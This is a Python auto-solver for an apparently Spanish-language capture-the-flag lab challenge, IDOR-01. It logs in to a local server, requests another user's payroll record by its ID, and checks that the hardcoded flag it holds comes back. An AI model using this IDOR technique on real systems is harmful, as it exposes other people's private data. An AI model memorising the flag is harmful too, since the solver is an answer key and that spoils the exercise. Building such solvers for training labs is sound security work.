#!/usr/bin/env python3
"""Auto-solver IDOR-01."""

import argparse
import sys

from solve_ctf_auth import asegurar_sesion

FLAG = "flag{idor_nomina_ajena}"


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--base", default="http://127.0.0.1:5000")
    args = p.parse_args()
    base = args.base.rstrip("/")
    s = asegurar_sesion(base)
    s.get(f"{base}/objetivos/idor/01", timeout=20)
    r = s.get(f"{base}/objetivos/idor/01/nomina/1", params={"json": "1"}, timeout=20)
    r.raise_for_status()
    data = r.json()
    assert data.get("flag") == FLAG or FLAG in str(data), data
    print(f"[OK] IDOR-01 — {FLAG}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
